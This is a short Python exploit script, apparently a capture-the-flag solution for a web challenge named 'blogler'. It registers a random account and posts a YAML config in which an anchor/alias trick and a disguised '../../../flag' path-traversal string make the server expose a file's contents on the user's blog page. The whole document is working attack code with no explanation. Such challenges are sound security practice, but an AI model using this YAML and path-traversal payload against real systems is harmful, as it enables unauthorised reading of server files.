import requests
import os

base = "https://blogler-638i6.instancer.lac.tf/"
url = lambda end: f"{base.rstrip('/')}{end}"

s = requests.Session()

username = "user_" + os.urandom(8).hex()
password = os.urandom(8).hex()

r = s.post(url("/register"), data={
    "username": username,
    "password": password
})
r.raise_for_status()
print(r.text)
assert "session" in s.cookies

flag_path = "../../../flag"

yaml_payload = f"""
user: &owo
  name: "{flag_path.replace("../", "_._._/")}"
  password: {password}
  title: rawr
blogs:
  - *owo
""".strip()

r = s.post(url("/config"), data={"config": yaml_payload})
print(r.text)
r.raise_for_status()
print(r)

print("========")
print("New config:")
print(s.get(url("/config")).text)

print("========")
print(r := s.get(url(f"/blog/{username}")))
print(r.text)
